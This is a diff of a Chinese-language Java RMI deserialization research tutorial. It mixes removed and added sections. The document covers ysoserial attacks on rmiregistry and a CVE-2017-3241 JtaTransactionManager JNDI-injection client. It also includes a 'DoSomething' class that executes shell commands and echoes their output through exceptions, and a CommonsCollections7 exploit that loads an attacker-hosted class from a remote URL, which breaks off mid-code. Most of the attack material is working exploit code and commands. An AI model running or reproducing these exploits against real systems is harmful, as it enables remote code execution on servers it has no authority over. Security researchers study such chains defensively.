+# Patterns are separated by ";" (semicolon).
+# Whitespace is significant and is considered part of the pattern.
+#
+# If the system property jdk.serialFilter is also specified, it supersedes
+# the security property value defined here.
+#
+# If a pattern includes a "=", it sets a limit.
+# If a limit appears more than once the last value is used.
+# Limits are checked before classes regardless of the order in the sequence of patterns.
+# If any of the limits are exceeded, the filter status is REJECTED.
+#
+#   maxdepth=value - the maximum depth of a graph
+#   maxrefs=value  - the maximum number of internal references
+#   maxbytes=value - the maximum number of bytes in the input stream
+#   maxarray=value - the maximum array length allowed
+#
+# Other patterns, from left to right, match the class or package name as
+# returned from Class.getName.
+# If the class is an array type, the class or package to be matched is the element type.
+# Arrays of any number of dimensions are treated the same as the element type.
+# For example, a pattern of "!example.Foo", rejects creation of any instance or
+# array of example.Foo.
+#
+# If the pattern starts with "!", the status is REJECTED if the remaining pattern
+#   is matched; otherwise the status is ALLOWED if the pattern matches.
+# If the pattern ends with ".**" it matches any class in the package and all subpackages.
+# If the pattern ends with ".*" it matches any class in the package.
+# If the pattern ends with "*", it matches any class with the pattern as a prefix.
+# If the pattern is equal to the class name, it matches.
+# Otherwise, the status is UNDECIDED.
+#
+# Primitive types are not configurable with this filter.
+#
+#jdk.serialFilter=pattern;pattern
 
-import org.springframework.transaction.support.*;
-import org.springframework.transaction.TransactionDefinition;
+#
+# RMI Registry Serial Filter
+#
+# The filter pattern uses the same format as jdk.serialFilter.
+# This filter can override the builtin filter if additional types need to be
+# allowed or rejected from the RMI Registry or to decrease limits but not
+# to increase limits.
+# If the limits (maxdepth, maxrefs, or maxbytes) are exceeded, the object is rejected.
+#
+# The maxdepth of any array passed to the RMI Registry is set to
+# 10000.  The maximum depth of the graph is set to 20.
+# These limits can be reduced via the maxarray, maxdepth limits.
+#
+#sun.rmi.registry.registryFilter=pattern;pattern
 
-/*
- * 在本次演示方案中，必须是public的，必须继承AbstractPlatformTransactionManager
- */
-public class Message3 extends AbstractPlatformTransactionManager
+#
+# Array construction of any component type, including subarrays and arrays of
+# primitives, are allowed unless the length is greater than the maxarray limit.
+# The filter is applied to each array element.
+#
+# The built-in filter allows subclasses of allowed classes and
+# can approximately be represented as the pattern:
+#
+#sun.rmi.registry.registryFilter=\
+#    maxarray=1000000;\
+#    maxdepth=20;\
+#    java.lang.String;\
+#    java.lang.Number;\
+#    java.lang.reflect.Proxy;\
+#    java.rmi.Remote;\
+#    sun.rmi.server.UnicastRef;\
+#    sun.rmi.server.RMIClientSocketFactory;\
+#    sun.rmi.server.RMIServerSocketFactory;\
+#    java.rmi.activation.ActivationID;\
+#    java.rmi.server.UID
+#
+# RMI Distributed Garbage Collector (DGC) Serial Filter
+#
+# The filter pattern uses the same format as jdk.serialFilter.
+# This filter can override the builtin filter if additional types need to be
+# allowed or rejected from the RMI DGC.
+#
+# The builtin DGC filter can approximately be represented as the filter pattern:
+#
+#sun.rmi.transport.dgcFilter=\
+#    java.rmi.server.ObjID;\
+#    java.rmi.server.UID;\
+#    java.rmi.dgc.VMID;\
+#    java.rmi.dgc.Lease;\
+#    maxdepth=5;maxarray=10000
+--------------------------------------------------------------------------
+
+13) 为什么CommonsCollections5攻击JDK自带rmiregistry失败
+
+参看:
+
+《Java RMI入门》
+http://scz.617.cn/network/202002221000.txt
+
+在"9.1.1) inside rmiregistry"小节讲过，"rmiregistry 1099"相当于
+"java sun.rmi.registry.RegistryImpl 1099"。
+
+起初研究"攻击RMI Registry"，没有专门写服务端、客户端，是这样测试的:
+
+java_8_40 \
+-cp "commons-collections-3.1.jar" \
+sun.rmi.registry.RegistryImpl 1099
+
+java \
+-cp ysoserial-0.0.6-SNAPSHOT-all.jar \
+ysoserial.exploit.RMIRegistryExploit 192.168.65.23 1099 CommonsCollections5 \
+"/bin/touch /tmp/scz_is_here"
+
+想法很美好，服务端、客户端都是现成的。但客户端得到异常:
+
+java.security.AccessControlException: access denied ("java.lang.RuntimePermission" "accessClassInPackage.sun.reflect.annotation")
+        at java.security.AccessControlContext.checkPermission(AccessControlContext.java:457)
+        at java.security.AccessControlContext.checkPermission2(AccessControlContext.java:523)
+        at java.security.AccessControlContext.checkPermission(AccessControlContext.java:466)
+        at java.security.AccessController.checkPermission(AccessController.java:884)
+        at java.lang.SecurityManager.checkPermission(SecurityManager.java:549)
+        at java.lang.SecurityManager.checkPackageAccess(SecurityManager.java:1564)
+        at sun.misc.Launcher$AppClassLoader.loadClass(Launcher.java:311)
+        at java.lang.ClassLoader.loadClass(ClassLoader.java:411)
+        at java.lang.ClassLoader.loadClass(ClassLoader.java:411)
+        at sun.rmi.server.LoaderHandler$Loader.loadClass(LoaderHandler.java:1207)
+        at java.lang.ClassLoader.loadClass(ClassLoader.java:357)
+        at java.lang.Class.forName0(Native Method)
+        at java.lang.Class.forName(Class.java:348)
+        at sun.rmi.server.LoaderHandler.loadClassForName(LoaderHandler.java:1221)
+        at sun.rmi.server.LoaderHandler.loadClass(LoaderHandler.java:453)
+        at sun.rmi.server.LoaderHandler.loadClass(LoaderHandler.java:186)
+        at java.rmi.server.RMIClassLoader$2.loadClass(RMIClassLoader.java:637)
+        at java.rmi.server.RMIClassLoader.loadClass(RMIClassLoader.java:264)
+        at sun.rmi.server.MarshalInputStream.resolveClass(MarshalInputStream.java:214)
+        at java.io.ObjectInputStream.readNonProxyDesc(ObjectInputStream.java:1613)
+        at java.io.ObjectInputStream.readClassDesc(ObjectInputStream.java:1518)
+        at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:1774)
+        at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1351)
+        at java.io.ObjectInputStream.defaultReadFields(ObjectInputStream.java:1993)
+        at java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:1918)
+        at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:1801)
+        at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1351)
+        at java.io.ObjectInputStream.readObject(ObjectInputStream.java:371)
+        at sun.rmi.registry.RegistryImpl_Skel.dispatch(Unknown Source)
+        at sun.rmi.server.UnicastServerRef.oldDispatch(UnicastServerRef.java:410)
+        at sun.rmi.server.UnicastServerRef.dispatch(UnicastServerRef.java:268)
+        at sun.rmi.transport.Transport$1.run(Transport.java:200)
+        at sun.rmi.transport.Transport$1.run(Transport.java:197)
+        at java.security.AccessController.doPrivileged(Native Method)
+        at sun.rmi.transport.Transport.serviceCall(Transport.java:196)
+        at sun.rmi.transport.tcp.TCPTransport.handleMessages(TCPTransport.java:568)
+        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0(TCPTransport.java:826)
+        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.lambda$run$78(TCPTransport.java:683)
+        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler$$Lambda$1/1401807365.run(Unknown Source)
+        at java.security.AccessController.doPrivileged(Native Method)
+        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run(TCPTransport.java:682)
+        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)
+        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)
+        at java.lang.Thread.run(Thread.java:745)
+        at sun.rmi.transport.StreamRemoteCall.exceptionReceivedFromServer(StreamRemoteCall.java:303)
+        at sun.rmi.transport.StreamRemoteCall.executeCall(StreamRemoteCall.java:279)
+        at sun.rmi.server.UnicastRef.invoke(UnicastRef.java:375)
+        at sun.rmi.registry.RegistryImpl_Stub.bind(RegistryImpl_Stub.java:73)
+        at ysoserial.exploit.RMIRegistryExploit$1.call(RMIRegistryExploit.java:77)
+        at ysoserial.exploit.RMIRegistryExploit$1.call(RMIRegistryExploit.java:71)
+        at ysoserial.secmgr.ExecCheckingSecurityManager.callWrapped(ExecCheckingSecurityManager.java:72)
+        at ysoserial.exploit.RMIRegistryExploit.exploit(RMIRegistryExploit.java:71)
+        at ysoserial.exploit.RMIRegistryExploit.main(RMIRegistryExploit.java:65)
+
+看了一眼sun.rmi.registry.RegistryImpl.main()，一上来就安装SecurityManager。
+为了减少干挠，弄个all.policy:
+
+--------------------------------------------------------------------------
+grant
 {
-    private static final long   serialVersionUID    = 0x5120131473637a00L;
+permission java.security.AllPermission;
+};
+--------------------------------------------------------------------------
 
-    private String  msg;
+换个方式启动服务端:
 
-    public Message3 ()
-    {
-    }
+java_8_40 \
+-cp "commons-collections-3.1.jar" \
+-Djava.security.policy=all.policy \
+sun.rmi.registry.RegistryImpl 1099
 
-    public Message3 ( String msg )
-    {
-        this.msg    = msg;
-    }
+java \
+-cp ysoserial-0.0.6-SNAPSHOT-all.jar \
+ysoserial.exploit.RMIRegistryExploit 192.168.65.23 1099 CommonsCollections5 \
+"/bin/touch /tmp/scz_is_here"
 
-    public String getMsg ()
-    {
-        return( this.msg );
-    }
+客户端居然无声无息结束，恶意命令未被执行。调试服务端:
 
-    public void setMsg ( String msg )
-    {
-        this.msg    = msg;
-    }
+java_8_40 -agentlib:jdwp=transport=dt_socket,address=192.168.65.23:8005,server=y,suspend=y \
+-cp "commons-collections-3.1.jar" \
+-Djava.security.policy=all.policy \
+sun.rmi.registry.RegistryImpl 1099
 
-    /*
-     * 后面这些函数是继承AbstractPlatformTransactionManager时必须重载的，
-     * 否则编译报错，这就是代价。我是按编译报错提示依次增加的。
-     */
+jdb -connect com.sun.jdi.SocketAttach:hostname=192.168.65.23,port=8005
 
-    @Override
-    protected void doRollback ( DefaultTransactionStatus status )
-    {
-    }
+stop in javax.management.BadAttributeValueExpException.readObject
 
-    @Override
-    protected void doCommit ( DefaultTransactionStatus status )
-    {
-    }
+这个断点有命中，说明基本反序列过程已经完成。单步跟踪这个函数，发现如果有
+SecurityManager，CommonsCollections5流程无法到达TiedMapEntry.toString()。
 
-    @Override
-    protected void doBegin ( Object transaction, TransactionDefinition definition )
-    {
-    }
+参看:
 
-    @Override
-    protected Object doGetTransaction ()
-    {
-        return null;
+http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/jdk8u40-b26/src/share/classes/javax/management/BadAttributeValueExpException.java
+
+```java
+/*
+ * 8u40
+ *
+ * javax.management.BadAttributeValueExpException.readObject
+ */
+private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
+    ObjectInputStream.GetField gf = ois.readFields();
+    Object valObj = gf.get("val", null);
+
+    if (valObj == null) {
+        val = null;
+    } else if (valObj instanceof String) {
+        val= valObj;
+/*
+ * 78行，如果有SecurityManager，CommonsCollections5攻击流程不会去86行。
+ */
+    } else if (System.getSecurityManager() == null
+            || valObj instanceof Long
+            || valObj instanceof Integer
+            || valObj instanceof Float
+            || valObj instanceof Double
+            || valObj instanceof Byte
+            || valObj instanceof Short
+            || valObj instanceof Boolean) {
+/*
+ * 86行，看简化版调用关系，TiedMapEntry.toString()由此进入
+ */
+        val = valObj.toString();
+    } else { // the serialized object is from a version without JDK-8019292 fix
+        val = System.identityHashCode(valObj) + "@" + valObj.getClass().getName();
     }
 }
---------------------------------------------------------------------------
+```
 
-13.2) SomeInterface3.java
+客户端换用CommonsCollections6就可以得手。不过现实世界中，假设用rmiregistry
+提供周知端口，不可能带着all.policy启动，此时CommonsCollections1至7全歇菜。
 
---------------------------------------------------------------------------
+这一小节没啥意思，就是记录一下中间碰到的各种坑，这是其中一个坑。从坑中爬出
+来后才自己写的RMIRegistryServer.java。人生就是一个接一个的坑，区别只有坑深
+坑浅，而非有坑无坑。
+
+14) 基于报错回显的PoC
+
+之前所有的PoC都是盲执行，拿不到命令执行结果，没有回显。参[59]，文中提供了
+一个基于报错回显的例子。参看:
+
+《Java RMI入门(5)》
+http://scz.617.cn/network/202003241127.txt
+
+8.6小节介绍利用java.net.URLClassLoader干复杂的事。
+
+14.1) DoSomething.java
+
+```java
 /*
- * javac -encoding GBK -g SomeInterface3.java
+ * javac -encoding GBK -g DoSomething.java
  */
-import java.rmi.*;
-import any.Message3;
-
-public interface SomeInterface3 extends Remote
-{
-    public String Echo ( Message3 sth ) throws RemoteException;
-}
---------------------------------------------------------------------------
-
-13.3) SomeInterface3Impl.java
-
---------------------------------------------------------------------------
-/*
- * javac -encoding GBK -g -cp "spring-tx-4.2.4.RELEASE.jar:." SomeInterface3Impl.java
- */
-import java.rmi.RemoteException;
-import java.rmi.server.UnicastRemoteObject;
-import any.Message3;
-
-public class SomeInterface3Impl extends UnicastRemoteObject implements SomeInterface3
-{
-    private static final long   serialVersionUID    = 0x5120131473637a01L;
-
-    /*
-     * 在本次演示方案中，不再是protected
-     */
-    public SomeInterface3Impl () throws RemoteException
-    {
-        super();
-    }
-
-    @Override
-    public String Echo ( Message3 sth ) throws RemoteException
-    {
-        return( "[" + sth.getMsg() + "]" );
-    }
-}
---------------------------------------------------------------------------
-
-13.4) SomeDynamicServer3.java
-
---------------------------------------------------------------------------
-/*
- * javac -encoding GBK -g SomeDynamicServer3.java
- */
-import javax.naming.*;
-
-public class SomeDynamicServer3
-{
-    public static void main ( String[] argv ) throws Exception
-    {
-        String          name    = argv[0];
-        Context         ctx     = new InitialContext();
-        SomeInterface3  some    = new SomeInterface3Impl();
-        ctx.rebind( name, some );
-    }
-}
---------------------------------------------------------------------------
-
-13.5) SomeNormalClient3.java
-
---------------------------------------------------------------------------
-/*
- * javac -encoding GBK -g SomeNormalClient3.java
- */
-import javax.naming.*;
-import any.Message3;
-
-public class SomeNormalClient3
-{
-    public static void main ( String[] argv ) throws Exception
-    {
-        String          name    = argv[0];
-        String          sth     = argv[1];
-        Context         ctx     = new InitialContext();
-        SomeInterface3  some    = ( SomeInterface3 )ctx.lookup( name );
-        String          resp    = some.Echo( new Message3( sth ) );
-        System.out.println( resp );
-    }
-}
---------------------------------------------------------------------------
-
-13.6) normal版PublicKnown3.java
-
---------------------------------------------------------------------------
-/*
- * javac -encoding GBK -g normal/PublicKnown3.java
- */
-package other;
-
 import java.io.*;
 
-/*
- * normal版PublicKnown3
- */
-public class PublicKnown3 implements Serializable
+public class DoSomething
 {
-    private static final long   serialVersionUID    = 0x5120131473637a02L;
-
-    private void readObject ( ObjectInputStream ois )
-        throws IOException, ClassNotFoundException
+    public DoSomething ( Object[] argv ) throws Exception
     {
-        System.out.println( "PublicKnown3.readObject()" );
-        ois.defaultReadObject();
+        Operator( argv );
     }
-}
---------------------------------------------------------------------------
-
-13.7) fake版PublicKnown3.java
-
---------------------------------------------------------------------------
-/*
- * javac -encoding GBK -g -cp "spring-tx-4.2.4.RELEASE.jar:spring-core-4.2.4.RELEASE.jar:." fake/PublicKnown3.java
- */
-package other;
-
-import any.Message3;
-
-/*
- * fake版PublicKnown3
- */
-public class PublicKnown3 extends Message3
-{
-    private static final long   serialVersionUID    = 0x5120131473637a02L;
-}
---------------------------------------------------------------------------
-
-13.8) SomeEvilClient3.java
-
---------------------------------------------------------------------------
-/*
- * javac -encoding GBK -g -cp "spring-tx-4.2.4.RELEASE.jar:." SomeEvilClient3.java
- */
-import javax.naming.*;
-import other.PublicKnown3;
-
-public class SomeEvilClient3
-{
-    public static void main ( String[] argv ) throws Exception
-    {
-        String          name    = argv[0];
-        String          sth     = argv[1];
-        Context         ctx     = new InitialContext();
-        SomeInterface3  some    = ( SomeInterface3 )ctx.lookup( name );
-        /*
-         * 使用fake版PublicKnown3
-         */
-        PublicKnown3    p       = new PublicKnown3();
-        p.setMsg( sth );
-        String          resp    = some.Echo( p );
-        System.out.println( resp );
-    }
-}
---------------------------------------------------------------------------
-
-13.9) 编译
-
-假设目录结构是:
-
-.
-|
-|   SomeDynamicServer3.class
-|   SomeDynamicServer3.java
-|   SomeEvilClient3.class
-|   SomeEvilClient3.java
-|   SomeInterface3.class
-|   SomeInterface3.java
-|   SomeInterface3Impl.class
-|   SomeInterface3Impl.java
-|   SomeNormalClient3.class
-|   SomeNormalClient3.java
-|   spring-tx-4.2.4.RELEASE.jar
-|   spring-core-4.2.4.RELEASE.jar
-|
-+---any
-|       Message3.class
-|       Message3.java
-|
-+---fake
-|       PublicKnown3.class (fake版)
-|       PublicKnown3.java
-|
-+---normal
-|       PublicKnown3.class (normal版)
-|       PublicKnown3.java
-|
-\---other
-        PublicKnown3.class (fake版)
-
-编译:
-
-javac -encoding GBK -g -cp "spring-tx-4.2.4.RELEASE.jar:spring-core-4.2.4.RELEASE.jar" any/Message3.java
-javac -encoding GBK -g SomeInterface3.java
-javac -encoding GBK -g -cp "spring-tx-4.2.4.RELEASE.jar:." SomeInterface3Impl.java
-javac -encoding GBK -g SomeDynamicServer3.java
-javac -encoding GBK -g SomeNormalClient3.java
-javac -encoding GBK -g normal/PublicKnown3.java
-javac -encoding GBK -g -cp "spring-tx-4.2.4.RELEASE.jar:spring-core-4.2.4.RELEASE.jar:." fake/PublicKnown3.java
-javac -encoding GBK -g -cp "spring-tx-4.2.4.RELEASE.jar:." SomeEvilClient3.java
-
-13.10) 测试
-
-假设目录结构是:
-
-.
-|
-+---test1
-|   |   SomeDynamicServer3.class
-|   |   SomeInterface3.class
-|   |   SomeInterface3Impl.class
-|   |   spring-tx-4.2.4.RELEASE.jar
-|   |   spring-core-4.2.4.RELEASE.jar
-|   |   commons-logging-1.2.jar
-|   |
-|   +---any
-|   |       Message3.class
-|   |
-|   \---other
-|           PublicKnown3.class (normal版)
-|
-\---test2
-    |   SomeEvilClient3.class
-    |   SomeInterface3.class
-    |   SomeNormalClient3.class
-    |   spring-tx-4.2.4.RELEASE.jar
-    |   spring-core-4.2.4.RELEASE.jar
-    |   commons-logging-1.2.jar
-    |
-    +---any
-    |       Message3.class
-    |
-    \---other
-            PublicKnown3.class (fake版)
-
-在test1目录执行:
-
-rmiregistry \
--J-Djava.class.path="spring-tx-4.2.4.RELEASE.jar:spring-core-4.2.4.RELEASE.jar" \
-1099
-
-java \
--cp "spring-tx-4.2.4.RELEASE.jar:spring-core-4.2.4.RELEASE.jar:commons-logging-1.2.jar:." \
--Djava.naming.factory.initial=com.sun.jndi.rmi.registry.RegistryContextFactory \
--Djava.naming.provider.url=rmi://192.168.65.23:1099 \
-SomeDynamicServer3 any
-
-在test2目录执行:
-
-java \
--cp "spring-tx-4.2.4.RELEASE.jar:spring-core-4.2.4.RELEASE.jar:commons-logging-1.2.jar:." \
--Djava.naming.factory.initial=com.sun.jndi.rmi.registry.RegistryContextFactory \
--Djava.naming.provider.url=rmi://192.168.65.23:1099 \
-SomeNormalClient3 any "msg from client"
-
-java \
--cp "spring-tx-4.2.4.RELEASE.jar:spring-core-4.2.4.RELEASE.jar:commons-logging-1.2.jar:." \
--Djava.naming.factory.initial=com.sun.jndi.rmi.registry.RegistryContextFactory \
--Djava.naming.provider.url=rmi://192.168.65.23:1099 \
-SomeEvilClient3 any "msg from client"
-
-14) JtaTransactionManager利用链
-
-CVE-2017-3241本质上是Java反序列化漏洞。各种PublicKnown们有各自的利用链，有
-些利用链涉及JNDI注入，比如:
-
-org.springframework.transaction.jta.JtaTransactionManager
-
-14.1) fake版JtaTransactionManager.java
-
---------------------------------------------------------------------------
-/*
- * javac -encoding GBK -g -cp "spring-tx-4.2.4.RELEASE.jar:spring-core-4.2.4.RELEASE.jar:." fake/JtaTransactionManager.java
- *
- * 包名必须一样
- */
-package org.springframework.transaction.jta;
-
-import any.Message3;
-
-/*
- * 参照fake版PublicKnown3实现fake版JtaTransactionManager
- */
-public class JtaTransactionManager extends Message3
-{
-    /*
-     * fake版JtaTransactionManager的这个值必须与normal版
-     * JtaTransactionManager相同。
-     */
-    private static final long   serialVersionUID    = 4720255569299536580L;
 
     /*
-     * 为了进一步触发JNDI注入漏洞，fake版必须定义该成员，并能对之赋值
+     * 我们是正经程序员，不是小黑黑，就算是写个PoC，也不能丢老司机的脸
      */
-    private String  userTransactionName;
-
-    public void setUserTransactionName ( String userTransactionName )
+    public static void Operator ( Object[] argv ) throws Exception
     {
-        this.userTransactionName    = userTransactionName;
+        int     opnum   = Integer.parseInt( ( String )argv[0] );
+        String  cmd;
+
+        /*
+         * Java没有函数指针的概念，本想弄个函数指针数组来着。参看:
+         *
+         * Array of function pointers in Java - [2010-05-02]
+         * https://stackoverflow.com/questions/2752192/array-of-function-pointers-in-java
+         *
+         * 还是switch吧，这样写只是为了将来的功能扩展及测试需要。
+         */
+        switch ( opnum )
+        {
+        case 0 :
+            cmd = ( String )argv[1];
+            Operator_0( cmd );
+            break;
+        case 1 :
+            cmd = ( String )argv[1];
+            Operator_1( cmd );
+            break;
+        default:
+            Operator_unknown();
+            break;
+        }
     }
-}
---------------------------------------------------------------------------
 
-假设明确知道服务端所用库版本，可以离线获取服务端serialVersionUID:
+    private static void Operator_0 ( String cmd ) throws Exception
+    {
+        Runtime.getRuntime().exec( new String[] { "/bin/sh", "-c", cmd } );
+    }
 
-$ serialver -classpath "spring-tx-4.2.4.RELEASE.jar:spring-beans-4.2.4.RELEASE.jar:spring-core-4.2.4.RELEASE.jar:javax.transaction-api-1.2.jar:commons-logging-1.2.jar:spring-context-4.2.4.RELEASE.jar" org.springframework.transaction.jta.JtaTransactionManager
-org.springframework.transaction.jta.JtaTransactionManager:    private static final long serialVersionUID = 4720255569299536580L;
+    private static void Operator_1 ( String cmd ) throws Exception
+    {
+        String  ret = PrivateExec( cmd );
+        //
+        // System.out.print( ret );
+        //
+        /*
+         * 通过异常向客户端传递信息
+         */
+        throw new InvalidClassException( "\n[\n" + ret + "]\n" );
+    }
 
-无论如何，总能在客户端异常中看到服务端serialVersionUID。
+    private static void Operator_unknown () throws Exception
+    {
+        throw new InvalidClassException( "\n[\nUnknown opnum\n]\n" );
+    }
 
-参[47]，作者实现fake版JtaTransactionManager.java时引入一个变量:
+    /*
+     * 参看:
+     *
+     * https://stackoverflow.com/questions/5711084/java-runtime-getruntime-getting-output-from-executing-a-command-line-program
+     *
+     * 这个贴子的回答及讨论都应该看一下，从下往上看
+     */
+    private static String PrivateExec ( String cmd ) throws IOException
+    {
+        /*
+         * https://docs.oracle.com/javase/8/docs/api/java/lang/ProcessBuilder.html
+         *
+         * 官网页面中有个例子
+         */
+        ProcessBuilder  pb  = new ProcessBuilder( "/bin/sh", "-c", cmd ).redirectErrorStream( true );
+        Process         p   = pb.start();
+        /*
+         * https://docs.oracle.com/javase/8/docs/api/java/lang/StringBuilder.html
+         */
+        StringBuilder   ret = new StringBuilder( 256 );
+        BufferedReader  in  = new BufferedReader( new InputStreamReader( p.getInputStream() ) );
+        String          line;
 
-public static final String DEFAULT_USER_TRANSACTION_NAME = "java:comp/UserTransaction";
+        while ( true )
+        {
+            line    = in.readLine();
+            if ( line == null )
+            {
+                break;
+            }
+            ret.append( line ).append( "\n" );
+        }
+        return( ret.toString() );
+    }
 
-不知要干啥，反正我没引入。
+    /*
+     * https://docs.oracle.com/javase/8/docs/api/java/lang/Exception.html
+     * https://docs.oracle.com/javase/8/docs/api/java/lang/Throwable.html
+     *
+     * 参看:
+     *
+     * https://stackoverflow.com/questions/17747175/how-can-i-loop-through-exception-getcause-to-find-root-cause-with-detail-messa
+     *
+     * 这个贴子的回答及讨论都应该看一下，从下往上看
+     */
+    private static Throwable PrivateGetRootCause ( Throwable e )
+    {
+        Throwable cause = null;
+        Throwable ret   = e;
 
-14.2) EvilClientWithJtaTransactionManager.java
+        while ( null != ( cause = ret.getCause() ) && ( ret != cause ) )
+        {
+            ret = cause;
+        }
+        return ret;
+    }
 
---------------------------------------------------------------------------
-/*
- * javac -encoding GBK -g -cp ".:spring-tx-4.2.4.RELEASE.jar" EvilClientWithJtaTransactionManager.java
- *
- * 注意-cp中当前目录最先出现，这样才能使用fake版JtaTransactionManager
- */
-import javax.naming.*;
-import org.springframework.transaction.jta.JtaTransactionManager;
-
-/*
- * 参照SomeEvilClient3实现EvilClientWithJtaTransactionManager
- */
-public class EvilClientWithJtaTransactionManager
-{
+    /*
+     * 方便测试而存在
+     */
     public static void main ( String[] argv ) throws Exception
     {
-        String          name    = argv[0];
-        String          sth     = argv[1];
-        /*
-         * rmi://192.168.65.23:1099/any
-         */
-        String          evilurl = argv[2];
-        Context         ctx     = new InitialContext();
-        SomeInterface3  some    = ( SomeInterface3 )ctx.lookup( name );
-        /*
-         * 使用fake版JtaTransactionManager
-         */
-        JtaTransactionManager
-                        jtm     = new JtaTransactionManager();
-        /*
-         * 通过反序列化漏洞进一步触发JNDI注入漏洞
-         */
-        jtm.setUserTransactionName( evilurl );
-        jtm.setMsg( sth );
-        some.Echo( jtm );
+        try
+        {
+            Operator( argv );
+        }
+        catch ( Exception e )
+        {
+            System.out.print( PrivateGetRootCause( e ).getLocalizedMessage() );
+        }
     }
 }
---------------------------------------------------------------------------
+```
 
-14.3) 编译
+DoSomething是恶意类，可以通过构造函数或成员函数Operator()执行恶意代码。通
+过opnum机制保持接口向后兼容性，将来扩展其他功能时，不影响之前的opnum。此为
+框架示例代码，未做容错处理。
 
-假设目录结构是:
+$ java DoSomething 1 "uname -a"
+$ java DoSomething 1 "ifconfig -a"
+$ java DoSomething 1 "ps -f -o pid,user,args"
+$ java DoSomething 1 "ps -ef"
+$ java DoSomething 1 "echo any > /tmp/some"
+$ java DoSomething 1 "ls -l nonexist"
 
-.
-|
-|   EvilClientWithJtaTransactionManager.class
-|   EvilClientWithJtaTransactionManager.java
-|   SomeInterface3.class
-|   spring-tx-4.2.4.RELEASE.jar
-|   spring-core-4.2.4.RELEASE.jar
-|
-+---any
-|       Message3.class
-|
-+---fake
-|       JtaTransactionManager.class (fake版)
-|       JtaTransactionManager.java
-|
-\---org/springframework/transaction/jta/
-        JtaTransactionManager.class (fake版)
+14.2) RMIRegistryExploitWithHashtable.java
 
-编译:
+```java
+/*
+ * javac -encoding GBK -g -cp "commons-collections-3.1.jar:." RMIRegistryExploitWithHashtable.java
+ */
+import java.io.*;
+import java.util.*;
+import java.lang.reflect.*;
+import java.rmi.Remote;
+import java.rmi.registry.*;
+import java.net.URL;
+import java.net.URLClassLoader;
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.*;
+import org.apache.commons.collections.map.LazyMap;
 
-javac -encoding GBK -g -cp "spring-tx-4.2.4.RELEASE.jar:spring-core-4.2.4.RELEASE.jar:." fake/JtaTransactionManager.java
-mkdir -p org/springframework/transaction/jta
-cp fake/JtaTransactionManager.class org/springframework/transaction/jta/
-javac -encoding GBK -g -cp ".:spring-tx-4.2.4.RELEASE.jar" EvilClientWithJtaTransactionManager.java
+/*
+ * 根据EvilURLClassLoaderWithConcurrentHashMap.java、
+ * LazyMapExecWithHashtable.java、
+ * EvilRMIRegistryClientWithBadAttributeValueExpException3.java修改而来，
+ * 用到CommonsCollections7。
+ */
+public class RMIRegistryExploitWithHashtable
+{
+    @SuppressWarnings("unchecked")
+    public static void main ( String[] argv ) throws Exception
+    {
+        String          addr        = argv[0];
+        int             port        = Integer.parseInt( argv[1] );
+        String          evilurl     = argv[2];
+        String          evilclass   = argv[3];
+        String[]        evilparam   = Arrays.copyOfRange
+        (
+            argv,
+            4,
+            argv.length
+        );
+        Transformer[]   tarray      = new Transformer[]
+        {
+            new ConstantTransformer( URLClassLoader.class ),
+            new InvokerTransformer
+            (
+                "getMethod",
+                new Class[]
+                {
+                    String.class,
+                    Class[].class
+                },
+                new Object[]
+                {
+                    "newInstance",
+                    new Class[]
+                    {
+                        URL[].class
+                    }
+                }
+            ),
+            new InvokerTransformer
+            (
+                "invoke",
+                new Class[]
+                {
+                    Object.class,
+                    Object[].class
+                },
+                new Object[]
+                {
+                    null,
+                    new Object[]
+                    {
+                        new URL[]
+                        {
+                            new URL( evilurl )
+                        }
+                    }
+                }
+            ),
+            new InvokerTransformer
+            (
+                "loadClass",
+                new Class[]
+                {
+                    String.class
+                },
+                new Object[]
+                {
+                    evilclass
+                }
+            ),
+            // new InvokerTransformer
+            // (
+            //     "getDeclaredConstructor",
+            //     new Class[]
+            //     {
+            //         Class[].class
+            //     },
+            //     new Object[]
+            //     {
+            //         new Class[]
+            //         {
+            //             Object[].class
+            //         }
+            //     }
+            // ),
+            // new InvokerTransformer
+            // (
+            //     "newInstance",
+            //     new Class[]
+            //     {
+            //         Object[].class
+            //     },
+            //     new Object[]
+            //     {
+            //         new Object[]
+            //         {
+            //             evilparam
+            //         }
+            //     }
+            // )
+            /*
+             * 故意换种方式演示
+             */
+            new InvokerTransformer
+            (
+                "getMethod",
+                new Class[]
+                {
+                    String.class,
+                    Class[].class
+                },
+                new Object[]
+                {
+                    "Operator",
+                    new Class[]
+                    {
+                        Object[].class
+                    }
+                }
+            ),
+            new InvokerTransformer
+            (
+                "invoke",
+                new Class[]
+                {
+                    Object.class,
+                    Object[].class
+                },
+                new Object[]
+                {
+                    null,
+                    new Object[]
+                    {
+                        evilparam
+                    }
+                }
+            )
+        };
+        Transformer     tchain      = new ChainedTransformer( new Transformer[0] );
+        Map             normalMap_0 = new HashMap();
+        Map             normalMap_1 = new HashMap();
+        Map             lazyMap_0   = LazyMap.decorate( normalMap_0, tchain );
+        Map             lazyMap_1   = LazyMap.decorate( normalMap_1, tchain );
+        lazyMap_0.put( "scz", "same" );
+        lazyMap_1.put( "tDz", "same" );
+        Hashtable       ht          = new Hashtable();
+        ht.put( lazyMap_0, "value_0" );
+        ht.put( lazyMap_1, "value_1" );
+        lazyMap_1.remove( "scz" );
+        Field           f           = ChainedTransformer.class.getDeclaredField( "iTransformers" );
+        f.setAccessible( true );
+        f.set( tchain, tarray );
+        /*
+         * 前面在准备待序列化数据，后面是一种另类的序列化过程
+         */
+        String          name        = "anything";
+        GeneralInvocationHandler3
+                        ih          = new GeneralInvocationHandler3( ht );
+        Remote          remoteProxy = ( Remote )Proxy.newProxyInstance
+        (
+            Remote.class.getClassLoader(),
+            new  Class[] { Remote.class },
+            ih
+        );
+        Registry        r           = LocateRegistry.getRegistry( addr, port );
